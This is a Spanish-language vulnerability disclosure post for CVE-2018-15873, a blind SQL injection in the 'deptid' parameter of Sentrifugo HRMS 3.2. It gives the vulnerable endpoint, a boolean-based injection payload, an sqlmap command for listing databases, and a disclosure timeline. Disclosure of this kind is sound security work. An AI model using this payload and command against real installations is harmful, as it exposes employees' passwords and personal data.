+++
date = "2018-08-26"
title = "CVE-2018-15873 Sentrifugo HRMS 3.2 - Blind SQL Injection"
author = "Javier Olmedo"
toc = false
+++

Esta entrada tiene como objetivo hacer p煤blica la vulnerabilidad[Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)descubierta en el software[Sentrifugo HRMS 3.2](http://www.sentrifugo.com/download), la vulnerabilidad ha sido asociada al[CVE-2018-15873](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-15873).

## Sentrifugo HRMS 3.2 - CVE-2018-15873

### Blind SQL Injection

[![/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_001.png](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_001.png)](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_001.png)

Sentrifugo es un software open source que facilita la**administraci贸n de recursos humanos**en las organizaciones. Est谩**repleto de m贸dulos**esenciales como evaluaci贸n, gesti贸n del tiempo, gesti贸n de licencias, gesti贸n de empleados, an谩lisis, contrataci贸n, verificaci贸n de antecedentes, servicio t茅cnico y mucho m谩s. Permite a los empleados**contribuir de manera efectiva y productiva**a los objetivos de la organizaci贸n.

- Vulnerabilidad descubierta por[Javier Olmedo](https://twitter.com/JJavierOlmedo)el**30/07/2018**
-  Publicada el**26/08/2018**
- [CVE-2018-15873](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15873)
- Link del software[Sentrifugo HRMS](http://www.sentrifugo.com/download)
- Versi贸n vulnerable =**3.2 y posiblemente anteriores**

## Vector de ataque / Criticidad de la explotaci贸n

### CRITICIDAD - CRTICA 

A trav茅s de las vulnerabilidades[Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection), un usuario malintencionadopodr铆a**leer informaci贸n de la base de datos que utiliza la aplicaci贸n**en base a preguntas de verdadero o falso con el objetivo de**extraer informaci贸n sensible o confidencial**como contrase帽as o datos personales de otros usuarios.

## Par谩metros vulnerables

El par谩metro`deptid`, es vulnerable a**Blind SQL Injecti贸n**mediante petici贸n**POST**en el recurso`/index.php/servicedeskconf/getemployees/format/html`

** Payload**

```txt
bunitid=0&deptid=(SELECT (CASE WHEN (5610=5610) THEN 5610 ELSE 5610*(SELECT 5610 FROM INFORMATION_SCHEMA.PLUGINS) END))&reqfor=2**
```

仿**Captura de pantalla de SQLmap lanzando el comando**

```bash
sqlmap -r poc.req -p deptid --dbms=MySQL --dbs
```

[![/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_002.png](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_002.png)](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_002.png)

## Prueba de concepto (PoC)

1.Si a帽adimos el caracter`'`en el par谩metro`deptid`obtenemos un**c贸digo 500**(error en la aplicaci贸n)

1.1 Petici贸n

[![/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_003.png](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_003.png)](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_003.png)

1.2 Respuesta

[![/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_004.png](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_004.png)](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_004.png)

2.En cambio, al a帽adir dos`'`, obtenemos un**c贸digo 200****OK**

2.1 Petici贸n

[![/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_005.png](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_005.png)](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_005.png)

2.2 Respuesta

[![/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_006.png](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_006.png)](/images/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection_006.png)

## Timeline

- **30/07/2018**Descubrimiento
- **30/07/2018**Informo al desarrollador
- **02/08/2018**Abro issue en GitHub
- **25/08/2018**Solicito CVE
- **25/08/2018**MITRE me asigna el CVE-2018-15873
- **26/08/2018**Hago p煤blica la vulnerabilidad

## Referencias

- CVE-MITRE -[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15873](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15873)

Un saludo a todos!!